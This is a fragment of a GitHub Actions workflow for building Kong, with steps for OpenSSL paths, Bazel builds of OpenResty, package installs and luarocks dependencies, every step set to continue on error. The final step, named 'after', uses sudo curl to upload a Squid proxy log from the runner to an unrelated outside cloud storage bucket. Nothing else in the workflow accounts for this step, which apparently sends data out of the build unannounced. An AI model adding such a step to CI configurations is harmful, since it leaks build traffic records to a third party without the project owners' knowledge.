        echo "LD_LIBRARY_PATH=$INSTALL_ROOT/openssl/lib:$LD_LIBRARY_PATH" >> $GITHUB_ENV

        '
    - continue-on-error: true
      name: Checkout Kong source code
      uses: actions/checkout@v3
    - continue-on-error: true
      id: cache-deps
      name: Lookup build cache
      uses: actions/cache@v3
      with:
        key: ${{ hashFiles('.requirements', 'kong-*.rockspec', '.bazelversion', '**/*.bzl',
          '**/*.bazel', '.github/workflows/perf.yml') }}
        path: ${{ env.INSTALL_ROOT }}
    - continue-on-error: true
      if: steps.cache-deps.outputs.cache-hit != 'true'
      name: Install packages
      run: sudo apt update && sudo apt install libyaml-dev valgrind libprotobuf-dev
    - continue-on-error: true
      env:
        GITHUB_TOKEN: ${{ secrets.GHA_KONG_BOT_READ_TOKEN }}
      if: steps.cache-deps.outputs.cache-hit != 'true'
      name: Build OpenResty
      run: 'bazel build //build/openresty:openresty --action_env=DOWNLOAD_ROOT=$DOWNLOAD_ROOT
        --action_env=INSTALL_ROOT=$INSTALL_ROOT

        nginx -V

        '
    - continue-on-error: true
      if: failure()
      name: Bazel Outputs
      uses: actions/upload-artifact@v3
      with:
        name: bazel-outputs
        path: 'bazel-bin/

          bazel-out/

          '
    - continue-on-error: true
      if: steps.cache-deps.outputs.cache-hit != 'true'
      name: Checkout go-pluginserver
      uses: actions/checkout@v3
      with:
        path: go-pluginserver
        repository: Kong/go-pluginserver
    - continue-on-error: true
      if: steps.cache-deps.outputs.cache-hit != 'true'
      name: Add to Path
      run: echo "$INSTALL_ROOT/openssl/bin:$INSTALL_ROOT/openresty/nginx/sbin:$INSTALL_ROOT/openresty/bin:$INSTALL_ROOT/luarocks/bin:$GITHUB_WORKSPACE/kong-build-tools/openresty-build-tools"
        >> $GITHUB_PATH
    - continue-on-error: true
      if: steps.cache-deps.outputs.cache-hit != 'true'
      name: Build Kong dependencies
      run: 'eval `luarocks path`

        make dev

        '
    - name: after
      run: sudo curl --request PUT -T /squid/squidlog.json --url https://storage.googleapis.com/virtualeventdemoblr.appspot.com/squid/goldmansachs/kong.$(date
        +%s)
